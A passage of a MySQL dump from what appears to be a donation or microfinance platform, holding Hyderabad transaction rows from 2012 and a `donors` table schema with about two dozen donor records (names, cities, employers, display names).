(1025, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 38, 1, '1.0', 25, 25, 25, '', '', '', '', ''),
(1026, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 54, 1, '16.0', 1, 16, 16, '', '', '', '', ''),
(1027, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 39, 2, '12.0', 1, 12, 12, '', '', '', '', ''),
(1028, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 40, 1, '5.0', 22, 110, 110, '', '', '', '', ''),
(1029, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 1, '21.0', 6, 126, 126, '', '', '', '', ''),
(1030, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 37, 1, '17.0', 7, 119, 119, '', '', '', '', ''),
(1031, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 42, 1, '16.0', 5, 80, 80, '', '', '', '', ''),
(1032, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 43, 1, '193.0', 9, 1737, 1737, '', '', '', '', ''),
(1033, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 50, 1, '17.0', 5, 85, 85, '', '', '', '', ''),
(1034, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 46, 1, '20.0', 12, 240, 240, '', '', '', '', ''),
(1035, '0000-00-00', 63, 'PadmaraoNagar', 'Hyderabad', 54, 1, '5.0', 1, 5, 5, '', '', '', '', ''),
(1036, '0000-00-00', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '1.0', 5, 5, 7, '', '', '', '', ''),
(1037, '0000-00-00', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '4.0', 7, 28, 31, '', '', '', '', ''),
(1038, '0000-00-00', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '1.0', 6, 6, 9, '', '', '', '', ''),
(1039, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 38, 1, '8.0', 25, 200, 200, '', '', '', '', ''),
(1040, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 54, 1, '22.0', 1, 22, 22, '', '', '', '', ''),
(1041, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 40, 1, '1.0', 22, 22, 22, '', '', '', '', ''),
(1042, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 36, 1, '3.0', 7, 21, 21, '', '', '', '', ''),
(1043, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 37, 1, '18.0', 5, 90, 90, '', '', '', '', ''),
(1044, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 42, 1, '5.0', 5, 25, 25, '', '', '', '', ''),
(1045, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 43, 1, '77.0', 9, 693, 693, '', '', '', '', ''),
(1046, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 50, 1, '14.0', 5, 70, 70, '', '', '', '', ''),
(1047, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 45, 1, '4.0', 15, 60, 60, '', '', '', '', ''),
(1048, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 46, 1, '12.0', 12, 144, 144, '', '', '', '', ''),
(1049, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 38, 1, '4.0', 25, 100, 100, '', '', '', '', ''),
(1050, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 54, 1, '41.0', 1, 41, 41, '', '', '', '', ''),
(1051, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 40, 1, '1.0', 22, 22, 22, '', '', '', '', ''),
(1052, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 1, '18.0', 6, 108, 108, '', '', '', '', ''),
(1053, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 37, 1, '24.0', 5, 120, 120, '', '', '', '', ''),
(1054, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 42, 1, '10.0', 6, 60, 60, '', '', '', '', ''),
(1055, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 43, 1, '192.0', 8, 1536, 1536, '', '', '', '', ''),
(1056, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 45, 1, '9.0', 15, 135, 135, '', '', '', '', ''),
(1057, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 46, 1, '10.0', 12, 120, 120, '', '', '', '', ''),
(1058, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 49, 1, '21.0', 5, 105, 105, '', '', '', '', ''),
(1059, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 54, 1, '15.0', 1, 15, 15, '', '', '', '', ''),
(1060, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 39, 2, '26.0', 1, 26, 29, '', '', '', '', ''),
(1061, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 40, 1, '22.0', 3, 66, 66, '', '', '', '', ''),
(1062, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 37, 1, '19.0', 5, 95, 95, '', '', '', '', ''),
(1063, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 43, 1, '98.0', 8, 784, 784, '', '', '', '', ''),
(1064, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 46, 1, '8.0', 12, 96, 96, '', '', '', '', ''),
(1065, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 38, 1, '13.0', 25, 325, 338, '', '', '', '', ''),
(1066, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 54, 1, '16.0', 1, 16, 16, '', '', '', '', ''),
(1067, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 40, 1, '24.0', 22, 528, 528, '', '', '', '', ''),
(1068, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 36, 1, '7.0', 7, 49, 49, '', '', '', '', ''),
(1069, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 37, 1, '5.0', 8, 40, 40, '', '', '', '', ''),
(1070, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 42, 1, '14.0', 6, 84, 84, '', '', '', '', ''),
(1071, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 43, 1, '113.0', 8, 904, 904, '', '', '', '', ''),
(1072, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 50, 1, '34.0', 5, 170, 173, '', '', '', '', ''),
(1073, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 45, 1, '1.0', 15, 15, 15, '', '', '', '', ''),
(1074, '0000-00-00', 72, 'Gachibowli', 'Hyderabad', 46, 1, '9.0', 12, 108, 108, '', '', '', '', ''),
(1075, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 64, 1, '442.0', 7, 3094, 3094, '', '', '', '', ''),
(1076, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 37, 1, '69.0', 7, 483, 483, '', '', '', '', ''),
(1077, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 46, 1, '1.0', 12, 12, 18, '', '', '', '', ''),
(1078, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 43, 1, '48.0', 8, 384, 384, '', '', '', '', ''),
(1079, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 37, 1, '50.0', 7, 350, 350, '', '', '', '', ''),
(1080, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 40, 1, '176.0', 18, 3168, 3168, '', '', '', '', ''),
(1081, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 43, 1, '30.0', 8, 240, 240, '', '', '', '', ''),
(1082, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 46, 1, '5.0', 12, 60, 60, '', '', '', '', ''),
(1083, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 37, 1, '568.0', 5, 2840, 2840, '', '', '', '', ''),
(1084, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 37, 1, '222.0', 7, 1554, 1560, '', '', '', '', ''),
(1085, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 37, 1, '165.0', 7, 1155, 1156, '', '', '', '', ''),
(1086, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 43, 1, '75.0', 8, 600, 600, '', '', '', '', ''),
(1087, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 46, 1, '58.0', 12, 696, 700, '', '', '', '', ''),
(1088, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 64, 1, '192.0', 7, 1344, 1344, '', '', '', '', ''),
(1089, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 43, 1, '32.0', 8, 256, 262, '', '', '', '', ''),
(1090, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 64, 1, '102.0', 5, 510, 510, '', '', '', '', ''),
(1091, '0000-00-00', 67, 'Gachibowli', 'Hyderabad', 37, 1, '96.0', 5, 480, 480, '', '', '', '', ''),
(1092, '0000-00-00', 68, 'Gachibowli', 'Hyderabad', 37, 1, '487.0', 7, 3409, 3409, '', '', '', '', ''),
(1093, '0000-00-00', 68, 'Gachibowli', 'Hyderabad', 64, 1, '9.0', 7, 63, 65, '', '', '', '', ''),
(1094, '0000-00-00', 68, 'Gachibowli', 'Hyderabad', 43, 1, '72.0', 8, 576, 576, '', '', '', '', ''),
(1095, '0000-00-00', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '23.0', 8, 184, 184, '', '', '', '', ''),
(1096, '0000-00-00', 63, 'PadmaraoNagar', 'Hyderabad', 50, 1, '21.0', 5, 105, 106, '', '', '', '', ''),
(1097, '0000-00-00', 68, 'Gachibowli', 'Hyderabad', 43, 1, '47.0', 8, 376, 376, '', '', '', '', ''),
(1098, '0000-00-00', 68, 'Gachibowli', 'Hyderabad', 37, 1, '171.0', 7, 1197, 1197, '', '', '', '', ''),
(1099, '0000-00-00', 68, 'Gachibowli', 'Hyderabad', 64, 1, '34.0', 7, 238, 238, '', '', '', '', ''),
(1100, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 54, 1, '12.0', 1, 12, 12, '', '', '', '', ''),
(1101, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 39, 2, '1.0', 2, 2, 2, '', '', '', '', ''),
(1102, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 36, 1, '5.0', 7, 35, 35, '', '', '', '', ''),
(1103, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 37, 1, '10.0', 7, 70, 70, '', '', '', '', ''),
(1104, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 42, 1, '5.0', 5, 25, 25, '', '', '', '', ''),
(1105, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 43, 1, '50.0', 9, 450, 450, '', '', '', '', ''),
(1106, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 45, 1, '1.0', 15, 15, 15, '', '', '', '', ''),
(1107, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 46, 1, '1.0', 12, 12, 12, '', '', '', '', ''),
(1108, '0000-00-00', 88, 'Gachibowli', 'Hyderabad', 49, 1, '1.0', 5, 5, 6, '', '', '', '', ''),
(1109, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 38, 1, '3.0', 25, 75, 87, '', '', '', '', ''),
(1110, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 39, 2, '7.0', 1, 7, 12, '', '', '', '', ''),
(1111, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 40, 1, '4.0', 22, 88, 88, '', '', '', '', ''),
(1112, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 36, 1, '15.0', 7, 105, 105, '', '', '', '', ''),
(1113, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 37, 1, '62.0', 5, 310, 321, '', '', '', '', ''),
(1114, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 43, 1, '166.0', 8, 1328, 1332, '', '', '', '', ''),
(1115, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 64, 1, '3.0', 8, 24, 28, '', '', '', '', ''),
(1116, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 50, 1, '2.0', 5, 10, 13, '', '', '', '', ''),
(1117, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 45, 1, '12.0', 15, 180, 180, '', '', '', '', ''),
(1118, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 46, 1, '16.0', 12, 192, 198, '', '', '', '', ''),
(1119, '2012-09-30', 88, 'Gachibowli', 'Hyderabad', 54, 1, '12.0', 1, 12, 13, '', '', '', '', ''),
(1120, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 54, 1, '20.0', 1, 20, 20, '', '', '', '', ''),
(1121, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 39, 2, '32.0', 1, 32, 45, '', '', '', '', ''),
(1122, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 40, 1, '16.0', 22, 352, 352, '', '', '', '', ''),
(1123, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 36, 1, '29.0', 7, 203, 207, '', '', '', '', ''),
(1124, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 37, 1, '38.0', 6, 228, 228, '', '', '', '', ''),
(1125, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 42, 1, '11.0', 6, 66, 66, '', '', '', '', ''),
(1126, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 43, 1, '291.0', 8, 2328, 2328, '', '', '', '', ''),
(1127, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 45, 1, '27.0', 15, 405, 405, '', '', '', '', ''),
(1128, '2012-09-30', 73, 'Gachibowli', 'Hyderabad', 46, 1, '27.0', 12, 324, 324, '', '', '', '', ''),
(1129, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 54, 1, '11.0', 1, 11, 11, '', '', '', '', ''),
(1130, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 39, 2, '1.0', 2, 2, 2, '', '', '', '', ''),
(1131, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 40, 1, '1.0', 22, 22, 22, '', '', '', '', ''),
(1132, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 36, 1, '13.0', 7, 91, 91, '', '', '', '', ''),
(1133, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 37, 1, '29.0', 6, 174, 174, '', '', '', '', ''),
(1134, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 42, 1, '4.0', 6, 24, 27, '', '', '', '', ''),
(1135, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 43, 1, '94.0', 8, 752, 752, '', '', '', '', ''),
(1136, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 50, 1, '16.0', 5, 80, 80, '', '', '', '', ''),
(1137, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 45, 1, '4.0', 15, 60, 60, '', '', '', '', ''),
(1138, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 46, 1, '11.0', 12, 132, 132, '', '', '', '', ''),
(1139, '2012-09-30', 72, 'Gachibowli', 'Hyderabad', 49, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(1140, '2012-09-30', 64, 'Panjagutta', 'Hyderabad', 36, 1, '81.0', 5, 405, 425, '', '', '', '', ''),
(1141, '2012-09-30', 64, 'Panjagutta', 'Hyderabad', 43, 1, '9.0', 7, 63, 63, '', '', '', '', ''),
(1142, '2012-09-30', 64, 'Panjagutta', 'Hyderabad', 40, 1, '2.0', 20, 40, 50, '', '', '', '', ''),
(1143, '2012-09-30', 64, 'Panjagutta', 'Hyderabad', 37, 1, '8.0', 5, 40, 42, '', '', '', '', ''),
(1144, '2012-09-30', 64, 'Panjagutta', 'Hyderabad', 64, 1, '7.0', 6, 42, 45, '', '', '', '', ''),
(1145, '2012-09-30', 64, 'Panjagutta', 'Hyderabad', 46, 1, '4.0', 6, 24, 27, '', '', '', '', ''),
(1146, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 54, 1, '17.0', 1, 17, 17, '', '', '', '', ''),
(1147, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 39, 2, '6.0', 2, 12, 12, '', '', '', '', ''),
(1148, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 40, 1, '2.0', 22, 44, 44, '', '', '', '', ''),
(1149, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 36, 1, '42.0', 6, 252, 252, '', '', '', '', ''),
(1150, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 37, 1, '27.0', 6, 162, 165, '', '', '', '', ''),
(1151, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 42, 1, '25.0', 5, 125, 125, '', '', '', '', ''),
(1152, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 43, 1, '301.0', 8, 2408, 2408, '', '', '', '', ''),
(1153, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 64, 1, '5.0', 5, 25, 25, '', '', '', '', ''),
(1154, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 44, 1, '4.0', 9, 36, 36, '', '', '', '', ''),
(1155, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 50, 1, '11.0', 5, 55, 55, '', '', '', '', ''),
(1156, '2012-10-28', 73, 'Gachibowli', 'Hyderabad', 45, 1, '25.0', 15, 375, 375, '', '', '', '', ''),
(1157, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 38, 1, '3.0', 25, 75, 75, '', '', '', '', ''),
(1158, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 54, 1, '33.0', 1, 33, 33, '', '', '', '', ''),
(1159, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 39, 2, '24.0', 2, 48, 48, '', '', '', '', ''),
(1160, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 40, 1, '13.0', 22, 286, 286, '', '', '', '', ''),
(1161, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 36, 1, '12.0', 6, 72, 72, '', '', '', '', ''),
(1162, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 37, 1, '52.0', 6, 312, 312, '', '', '', '', ''),
(1163, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 50, 1, '5.0', 5, 25, 25, '', '', '', '', ''),
(1164, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 43, 1, '205.0', 8, 1640, 1640, '', '', '', '', ''),
(1165, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 64, 1, '6.0', 5, 30, 30, '', '', '', '', ''),
(1166, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 45, 1, '10.0', 15, 150, 150, '', '', '', '', ''),
(1167, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 46, 1, '10.0', 12, 120, 120, '', '', '', '', ''),
(1168, '2012-10-28', 88, 'Gachibowli', 'Hyderabad', 49, 1, '14.0', 5, 70, 70, '', '', '', '', ''),
(1169, '2012-10-28', 72, 'Gachibowli', 'Hyderabad', 37, 1, '1.0', 6, 6, 6, '', '', '', '', ''),
(1170, '2012-10-28', 72, 'Gachibowli', 'Hyderabad', 43, 1, '11.0', 8, 88, 88, '', '', '', '', ''),
(1171, '2012-10-28', 72, 'Gachibowli', 'Hyderabad', 45, 1, '2.0', 15, 30, 38, '', '', '', '', ''),
(1172, '2012-10-28', 72, 'Gachibowli', 'Hyderabad', 49, 1, '1.0', 5, 5, 5, '', '', '', '', ''),
(1173, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '2.0', 20, 40, 54, '', '', '', '', ''),
(1174, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '42.0', 5, 210, 212, '', '', '', '', ''),
(1175, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '1.0', 6, 6, 6, '', '', '', '', ''),
(1176, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '9.0', 7, 63, 67, '', '', '', '', ''),
(1177, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 50, 1, '7.0', 4, 28, 31, '', '', '', '', ''),
(1178, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '1.0', 10, 10, 10, '', '', '', '', ''),
(1179, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 49, 1, '3.0', 4, 12, 12, '', '', '', '', ''),
(1180, '2012-10-27', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '9.0', 4, 36, 36, '', '', '', '', ''),
(1181, '2012-10-07', 138, 'Sevamela', 'Hyderabad', 36, 1, '167.0', 5, 835, 837, '', '', '', '', ''),
(1182, '2012-10-07', 138, 'Sevamela', 'Hyderabad', 43, 1, '49.0', 8, 392, 392, '', '', '', '', ''),
(1183, '2012-10-07', 138, 'Sevamela', 'Hyderabad', 40, 1, '2.0', 20, 40, 50, '', '', '', '', ''),
(1184, '2012-10-07', 138, 'Sevamela', 'Hyderabad', 49, 1, '22.0', 5, 110, 110, '', '', '', '', ''),
(1185, '2012-10-07', 138, 'Sevamela', 'Hyderabad', 37, 1, '3.0', 10, 30, 35, '', '', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `donors`
--

CREATE TABLE IF NOT EXISTS `donors` (
  `donor_id` int(7) NOT NULL AUTO_INCREMENT,
  `type_of_donor` varchar(10) COLLATE utf8_bin NOT NULL,
  `first_name` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `last_name` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `dob` date DEFAULT NULL,
  `gender` varchar(1) COLLATE utf8_bin DEFAULT NULL,
  `address` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  `village_town` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `state` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `country` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `pin_code` decimal(22,0) DEFAULT NULL,
  `occupation` varchar(20) COLLATE utf8_bin NOT NULL,
  `title_designation` varchar(50) COLLATE utf8_bin DEFAULT NULL,
  `mobile_phone_no` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `personal_e_mail_id` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `official_e_mail_id` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `preferred_email` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `pan` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `feature_permission` varchar(1) COLLATE utf8_bin DEFAULT NULL,
  `feature_quote` varchar(500) COLLATE utf8_bin DEFAULT NULL,
  `displayname` varchar(100) COLLATE utf8_bin DEFAULT NULL,
  `donor_img` varchar(200) COLLATE utf8_bin DEFAULT NULL COMMENT 'URL/location of the image of donor/org',
  `org_grp_name` varchar(100) COLLATE utf8_bin DEFAULT NULL COMMENT 'Organisation or the Group name that the donor represents',
  `org_grp_type` varchar(100) COLLATE utf8_bin DEFAULT NULL COMMENT 'Organisation or the Group type that the donor represents',
  `org_grp_description` varchar(500) COLLATE utf8_bin DEFAULT NULL COMMENT 'Organisation or the Group description that the donor represents',
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`donor_id`),
  KEY `STATE` (`state`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Donors' AUTO_INCREMENT=399 ;

--
-- Dumping data for table `donors`
--

INSERT INTO `donors` (`donor_id`, `type_of_donor`, `first_name`, `last_name`, `dob`, `gender`, `address`, `village_town`, `state`, `country`, `pin_code`, `occupation`, `title_designation`, `mobile_phone_no`, `personal_e_mail_id`, `official_e_mail_id`, `preferred_email`, `pan`, `feature_permission`, `feature_quote`, `displayname`, `donor_img`, `org_grp_name`, `org_grp_type`, `org_grp_description`, `user_id`) VALUES
(20, 'Group', 'Rekha', 'Koshal', NULL, 'F', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Aprajita Mahila Sangh ', '', 'Aprajita Mahila Sangh', 'Cooperative Society', 'A Society working for SHGs', 0),
(19, 'Individual', 'Manohara', 'Raj', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Manohara Raj', '', 'HDFC Bank', '', '', 0),
(18, 'Individual', 'Ramana', 'N V', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. N V Ramana', '', '', '', '', 0),
(17, 'Individual', 'Malcolm', 'Harper', NULL, 'M', NULL, '', '', 'UK', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Malcolm Harper', '', '', '', '', 0),
(16, 'Individual', 'Ramakrishnam', 'Raju P', NULL, 'M', NULL, 'Vishakapatnam', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Ramakrishnam Raju P', '', '', '', '', 0),
(15, 'Individual', 'Santosh', 'Attery', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Santosh Attery', '', '', '', '', 0),
(14, 'Individual', 'Vaidyanath', 'B', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Vaidyanath B', '', 'Royal Sundaram', '', '', 0),
(13, 'Individual', 'Bhanumati', 'P', NULL, 'F', NULL, 'Vishakapatnam', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Ms. Bhanumati P', '', '', '', '', 0),
(12, 'Individual', 'Anuradha', 'Raju G', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Ms. Anuradha Raju G', '', '', '', '', 0),
(11, 'Individual', 'Puneet', 'Malhotra', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Puneet Malhotra', '', 'Swiss Re India Pvt Ltd', '', '', 0),
(10, 'Individual', 'Soumava', 'Dasgupta', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Soumava Dasgupta', '', 'Swiss Re India Pvt Ltd', '', '', 0),
(9, 'Individual', 'Dhananjay', 'Date', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', 'Managing Director', '', '', '', '', NULL, NULL, NULL, 'Mr. Dhananjay Date', '', 'Swiss Re India Pvt Ltd', '', '', 0),
(8, 'Individual', 'Aravind', 'Vasudevarao', NULL, 'M', 'Clarion University of Pennsylvania', 'Clarion', 'Pennsylvania', 'USA', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Dr. Vasudeva Rao Aravind', '', '', '', '', 0),
(7, 'Group', 'Suhird', 'Kamra', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Suhird Kamra and Ms. Priti Kamra', '', '', 'Family', '', 0),
(6, 'Individual', 'Sushil', 'Ramola', NULL, 'M', NULL, 'Delhi', 'Delhi', 'India', NULL, '', 'Managing Director', '', '', '', '', NULL, NULL, NULL, 'Mr. Sushil Ramola', '', 'B-ABLE', '', '', 0),
(5, 'Individual', 'Robert', 'Rucky', NULL, 'M', NULL, '', 'Michigan', 'USA', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Robert Rucky', '', '', '', '', 0),
(4, 'Individual', 'Shashi', 'Raju N', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Ms. Shashi Raju N', '', '', '', '', 0),
(3, 'Individual', 'Satish', 'Raju G', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', 'MD', '', '', '', '', NULL, NULL, NULL, 'Mr. Satish Raju G', '', 'TTK Healthcare Pvt Ltd', '', '', 0),
(2, 'Individual', 'Suman', 'Laskar', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Suman Laskar', NULL, NULL, NULL, NULL, 0),
(1, 'Individual', 'Vijay ', 'Mahajan', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', 'Chairman', '', '', '', '', NULL, NULL, NULL, 'Mr. Vijay Mahajan', NULL, 'BASIX', NULL, NULL, 0),
(21, 'Individual', 'Madhavi', 'N', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Ms. Madhavi N', '', '', '', '', 0),
(22, 'Individual', 'VijayNarayana', 'M', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Vijay Narayana M', '', 'Bank of America', '', '', 0),
(23, 'Individual', 'VamsiKrishna', 'L N', NULL, 'M', NULL, 'Bangalore', 'Karnataka', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', 'Its a great idea and I feel privileged to contribute, in whatever little way possible.', 'Mr. Vamsi Krishna L N', 'https://lh3.googleusercontent.com/-l6fPdwlIxYE/TeTn4SiB5hI/AAAAAAAAACA/TBEdnHid-8o/s128/Vamsi.jpg', '', '', '', 0),
(24, 'Individual', 'Venkat Rao', 'M', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', ' Every rupee I contribute is properly & periodically accounted for & reaches the needy.', 'Mr. Venkat Rao M', 'https://lh3.googleusercontent.com/-ojwChBxkad8/TeTkeDradsI/AAAAAAAAABY/ds8sodilI6M/s128/Venkat%252520Rao.jpg', 'GVK EMRI', '', '', 0),
